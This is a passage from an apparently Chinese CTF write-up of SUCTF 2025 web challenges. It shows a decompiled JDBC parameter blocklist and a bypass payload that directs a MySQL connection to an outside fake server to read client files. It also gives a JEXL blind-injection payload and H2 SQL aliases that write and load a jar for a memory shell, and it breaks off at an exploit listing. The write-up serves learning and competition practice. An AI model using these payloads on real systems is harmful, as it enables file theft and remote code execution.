<span class="hljs-keyword">but</span> <span class="hljs-keyword">not</span> very smart programmers have designed protection <span class="hljs-keyword">to</span> protect <span class="hljs-keyword">it</span>. Can you bypass <span class="hljs-keyword">it</span>.By <span class="hljs-keyword">the</span> way, there <span class="hljs-keyword">is</span> confusion <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> provided source code<br>环境： (mysql-connector<span class="hljs-number">-8.0</span><span class="hljs-number">.28</span>) <span class="hljs-number">1.95</span><span class="hljs-number">.157</span><span class="hljs-number">.235</span>:<span class="hljs-number">10011</span> 本题不需要扫描、爆破等操作<br></code></pre></td></tr></table></figure><p>要用jadx才能正确打开那个class文件，因为有混淆。</p><p><code>SecurityChecker.class</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pho3n1x.sujava.security;<br><br><span class="hljs-keyword">import</span> java.io.UnsupportedEncodingException;<br><span class="hljs-keyword">import</span> java.net.URLDecoder;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><span class="hljs-keyword">import</span> java.util.stream.Collectors;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.StringUtils;<br><br><span class="hljs-comment">/* loaded from: SecurityChecker.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityChecker</span> &#123;<br><br>    <span class="hljs-comment">/* renamed from: checklist = &quot;allowLoadLocalInfile,autoDeserialize,allowLocalInfile,allowUrlInLocalInfile,#&quot;;</span><br><span class="hljs-comment">public static void checkJdbcConnParams(String host, Integer port, String username, String password, String database, Map&lt;String, Object&gt; extraParams) throws Exception &#123;</span><br><span class="hljs-comment">if (!host.trim().matches(&quot;^[a-zA-Z0-9.-]+$&quot;) || !database.matches(&quot;^[a-zA-Z0-9_]+$&quot;) || parseParamsMapToMysqlParamUrl(extraParams).matches(&quot;.*(allowLoadLocalInfile|autoDeserialize|allowLocalInfile|allowUrlInLocalInfile|#|%).*&quot;)) &#123;</span><br><span class="hljs-comment">throw new Exception(&quot;Invalid mysql connection params.&quot;);</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125;  reason: not valid java name and contains not printable characters */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">f0x2356168a</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AND_SYMBOL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&amp;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EQUAL_SIGN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;=&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">COMMA</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;,&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BLACKLIST_REGEX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;autodeserialize|allowloadlocalinfile|allowurlinlocalinfile|allowloadlocalinfileinpath&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">MYSQL_SECURITY_CHECK_ENABLE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">MYSQL_CONNECT_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://%s:%s/%s&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_MYSQL_PROTOCOL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_MATCH_REGEX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;(?i)jdbc:(?i)(mysql)://([^:]+)(:[0-9]+)?(/[a-zA-Z0-9_-]*[\\.\\-]?)?&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">MYSQL_SENSITIVE_PARAMS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;allowLoadLocalInfile,autoDeserialize,allowLocalInfile,allowUrlInLocalInfile,#&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkJdbcConnParams</span><span class="hljs-params">(String str, Integer num, String str2, String str3, String str4, Map&lt;String, Object&gt; map)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (Boolean.valueOf(MYSQL_SECURITY_CHECK_ENABLE).booleanValue()) &#123;<br>            <span class="hljs-keyword">if</span> (StringUtils.isAnyBlank(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CharSequence</span>[]&#123;str, str2&#125;)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Invalid mysql connection params.&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">format</span> <span class="hljs-operator">=</span> String.format(MYSQL_CONNECT_URL, str.trim(), num, str4.trim());<br>            checkHost(str.trim());<br>            checkUrl(format);<br>            checkParams(map);<br>            checkUrlIsSafe(format);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkHost</span><span class="hljs-params">(String str)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (str == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (str.startsWith(<span class="hljs-string">&quot;(&quot;</span>) || str.endsWith(<span class="hljs-string">&quot;)&quot;</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Invalid host&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkUrl</span><span class="hljs-params">(String str)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> ((str == <span class="hljs-literal">null</span> || str.toLowerCase().startsWith(JDBC_MYSQL_PROTOCOL)) &amp;&amp; !Pattern.compile(JDBC_MATCH_REGEX).matcher(str).matches()) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, Object&gt; <span class="hljs-title function_">parseMysqlUrlParamsToMap</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">if</span> (StringUtils.isBlank(str)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        &#125;<br>        String[] split = str.split(AND_SYMBOL);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(split.length);<br>        <span class="hljs-keyword">for</span> (String str2 : split) &#123;<br>            String[] split2 = str2.split(EQUAL_SIGN);<br>            <span class="hljs-keyword">if</span> (split2.length == <span class="hljs-number">2</span>) &#123;<br>                hashMap.put(split2[<span class="hljs-number">0</span>], split2[<span class="hljs-number">1</span>]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">parseParamsMapToMysqlParamUrl</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>        <span class="hljs-keyword">return</span> (map == <span class="hljs-literal">null</span> || map.isEmpty()) ? <span class="hljs-string">&quot;&quot;</span> : (String) map.entrySet().stream().map(entry -&gt; &#123;<br>            <span class="hljs-keyword">return</span> String.join(EQUAL_SIGN, (CharSequence) entry.getKey(), String.valueOf(entry.getValue()));<br>        &#125;).collect(Collectors.joining(AND_SYMBOL));<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkParams</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (map == <span class="hljs-literal">null</span> || map.isEmpty()) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Map&lt;String, Object&gt; parseMysqlUrlParamsToMap = parseMysqlUrlParamsToMap(URLDecoder.decode(parseParamsMapToMysqlParamUrl(map), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>            map.clear();<br>            map.putAll(parseMysqlUrlParamsToMap);<br>            Iterator&lt;Map.Entry&lt;String, Object&gt;&gt; it = map.entrySet().iterator();<br>            <span class="hljs-keyword">while</span> (it.hasNext()) &#123;<br>                Map.Entry&lt;String, Object&gt; next = it.next();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> next.getKey();<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> next.getValue();<br>                <span class="hljs-keyword">if</span> (StringUtils.isBlank(key) || value == <span class="hljs-literal">null</span> || StringUtils.isBlank(value.toString())) &#123;<br>                    it.remove();<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isNotSecurity(key, value.toString())) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Invalid mysql connection parameters: &quot;</span> + parseParamsMapToMysqlParamUrl(map));<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (UnsupportedEncodingException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;mysql connection cul decode error: &quot;</span> + e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNotSecurity</span><span class="hljs-params">(String str, String str2)</span> &#123;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">z</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str3</span> <span class="hljs-operator">=</span> MYSQL_SENSITIVE_PARAMS;<br>        <span class="hljs-keyword">if</span> (StringUtils.isBlank(str3)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        String[] split = str3.split(COMMA);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> split.length;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">if</span> (i &gt;= length) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isNotSecurity(str, str2, split[i])) &#123;<br>                z = <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                i++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> !z;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNotSecurity</span><span class="hljs-params">(String str, String str2, String str3)</span> &#123;<br>        <span class="hljs-keyword">return</span> str.toLowerCase().contains(str3.toLowerCase()) || str2.toLowerCase().contains(str3.toLowerCase());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkUrlIsSafe</span><span class="hljs-params">(String str)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> Pattern.compile(BLACKLIST_REGEX).matcher(str.toLowerCase());<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-keyword">while</span> (matcher.find()) &#123;<br>                <span class="hljs-keyword">if</span> (sb.length() &gt; <span class="hljs-number">0</span>) &#123;<br>                    sb.append(<span class="hljs-string">&quot;, &quot;</span>);<br>                &#125;<br>                sb.append(matcher.group());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (sb.length() &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;url contains blacklisted characters: &quot;</span> + ((Object) sb));<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;error occurred during url security check: &quot;</span> + e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">appendMysqlForceParams</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>        map.putAll(parseMysqlUrlParamsToMap(<span class="hljs-string">&quot;allowLoadLocalInfile=false&amp;autoDeserialize=false&amp;allowLocalInfile=false&amp;allowUrlInLocalInfile=false&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是一个正常打JDBC读文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/jdbc<br></code></pre></td></tr></table></figure><p>提示了 reason: not valid java name and contains not printable characters</p><p>检查逻辑后可以发现 host 字段的正则 Reg 可以进行注入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;(?i)jdbc:(?i)(mysql)://([^:]+)(:[0-9]+)?(/[a-zA-Z0-9_-]*[\\.\\-]?)?&quot;</span>;<br></code></pre></td></tr></table></figure><ul><li><code>([^:]+)</code> 可以一直匹配所有非冒号字符串</li><li>通过 url 全字符编码可以绕过关键词匹配waf</li><li>可以使用 # 来忽略最后插入的安全策略</li></ul><p>按照上述描述将下列字段注入到host中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">allowLoadLocalInfile=<span class="hljs-literal">true</span>&amp;allowUrlInLocalInfile=<span class="hljs-literal">true</span>&amp;allowLoadLocalInfileInPath=/&amp;maxAllowedPacket=<span class="hljs-number">655360</span><br></code></pre></td></tr></table></figure><p>使用MySQL_Fake_Server读取客户端文件就出了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">host=ADDRESS=(host=<span class="hljs-number">8.140</span><span class="hljs-number">.251</span><span class="hljs-number">.152</span>)(port=<span class="hljs-number">3306</span>)(database=test)(user=fileread_file%3A%<span class="hljs-number">2F</span>%<span class="hljs-number">2F</span>%<span class="hljs-number">2F</span>.)(%<span class="hljs-number">61</span>%6c%6c%<span class="hljs-number">6f</span>%<span class="hljs-number">77</span>%4c%<span class="hljs-number">6f</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%4c%<span class="hljs-number">6f</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%6c%<span class="hljs-number">49</span>%6e%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%6c%<span class="hljs-number">65</span>=<span class="hljs-literal">true</span>)(%<span class="hljs-number">61</span>%6c%6c%<span class="hljs-number">6f</span>%<span class="hljs-number">77</span>%4c%<span class="hljs-number">6f</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%4c%<span class="hljs-number">6f</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%6c%<span class="hljs-number">49</span>%6e%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%6c%<span class="hljs-number">65</span>%<span class="hljs-number">49</span>%6e%<span class="hljs-number">50</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">68</span>=%<span class="hljs-number">2F</span>)(%<span class="hljs-number">61</span>%6c%6c%<span class="hljs-number">6f</span>%<span class="hljs-number">77</span>%<span class="hljs-number">55</span>%<span class="hljs-number">72</span>%6c%<span class="hljs-number">49</span>%6e%4c%<span class="hljs-number">6f</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%6c%<span class="hljs-number">49</span>%6e%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%6c%<span class="hljs-number">65</span>=<span class="hljs-literal">true</span>)(%<span class="hljs-number">6d</span>%<span class="hljs-number">61</span>%<span class="hljs-number">78</span>%<span class="hljs-number">41</span>%6c%6c%<span class="hljs-number">6f</span>%<span class="hljs-number">77</span>%<span class="hljs-number">65</span>%<span class="hljs-number">64</span>%<span class="hljs-number">50</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%6b%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>=<span class="hljs-number">655360</span>)  #/test&amp;port=<span class="hljs-number">3306</span>&amp;database=test&amp;extraParams=&#123;&#125;&amp;username=test&amp;password=root<br></code></pre></td></tr></table></figure><p>欧阳学长还说会自动两次URL解码，也能直接打。</p><p>（本地环境有点问题，就不演示了xxxx）</p><h2 id="SU-ez-micronaut"><a href="#SU-ez-micronaut" class="headerlink" title="SU_ez_micronaut"></a>SU_ez_micronaut</h2><p>欧阳学长和赵哥靠着盲注再次拿下，tql。</p><p>这里保护一下版权就不放完整exp了，关键就是使用了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">f&quot;&quot;&quot;eyIxIjoiMSJ9&lt;---&gt;new(&#x27;cn.hutool.extra.expression.engine.jexl.JexlEngine&#x27;).eval(&quot;if(new(&#x27;cn.hutool.core.io.FileUtil&#x27;).readUtf8String(new(&#x27;cn.hutool.core.io.FileUtil&#x27;).file(&#x27;/flag.txt&#x27;)).charAt(<span class="hljs-subst">&#123;j&#125;</span>)==<span class="hljs-subst">&#123;i&#125;</span>)&#123;&#123;new(&#x27;java.lang.Thread&#x27;).sleep(5000);&#125;&#125;&quot;,null)&lt;---&gt;admin&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>来进行逐字节盲注：</p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250120185719395.png" class="" title="image-20250120185719395"><p>这道题官方wp写的很精彩，理解起来也有点小难度，复现也有点难绷emmm。。。</p><p>详见：<a href="https://www.yuque.com/yulate/sd2qe4/af7s0tsqlccm5ipe#f7fc871b">ez-micronaut</a></p><p>里面还有micronaut内存马挖掘的思路。</p><p>内存马做好之后，这里有两种思路，第一种是直接将注入内存马的代码按照h2 sql的语法进行编码转换执行，但是比较麻烦，需要将import的类都写成全类名进行使用。</p><p>第二种将jar包读取为二进制流再base64写到服务器，再使用loadClass加载：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- Step 1: 创建Base64解码和文件写入的ALIAS</span><br><span class="hljs-keyword">CREATE</span> ALIAS IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> BASE64_TO_JAR <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">void base64ToJar(String base64Data, String filePath) throws java.io.IOException &#123;</span><br><span class="hljs-string">    byte[] jarBytes = java.util.Base64.getDecoder().decode(base64Data);</span><br><span class="hljs-string">    try (java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath)) &#123;</span><br><span class="hljs-string">        fos.write(jarBytes);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;</span>;<br><br><span class="hljs-comment">-- Step 2: 创建加载JAR并执行方法的ALIAS</span><br><span class="hljs-keyword">CREATE</span> ALIAS IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> LOAD_JAR <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">void loadJar(String jarPath, String className, String methodName) throws Exception &#123;</span><br><span class="hljs-string">    java.net.URL jarUrl = new java.net.URL(&quot;file:&quot; + jarPath);</span><br><span class="hljs-string">    java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]&#123;jarUrl&#125;);</span><br><span class="hljs-string">    Class&lt;?&gt; loadedClass = classLoader.loadClass(className);</span><br><span class="hljs-string">    Object instance = loadedClass.getDeclaredConstructor().newInstance();</span><br><span class="hljs-string">    java.lang.reflect.Method method = loadedClass.getMethod(methodName);</span><br><span class="hljs-string">    method.invoke(instance);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;</span>;<br><br><span class="hljs-comment">-- Step 3: 执行Base64解码并写入JAR文件</span><br><span class="hljs-keyword">CALL</span> BASE64_TO_JAR(<span class="hljs-string">&#x27;你的base64数据&#x27;</span>, <span class="hljs-string">&#x27;yourfile.jar&#x27;</span>);<br><br><span class="hljs-comment">-- Step 4: 加载JAR并执行方法</span><br><span class="hljs-keyword">CALL</span> LOAD_JAR(<span class="hljs-string">&#x27;yourfile.jar&#x27;</span>, <span class="hljs-string">&#x27;com.example.YourClass&#x27;</span>, <span class="hljs-string">&#x27;executeMethod&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span 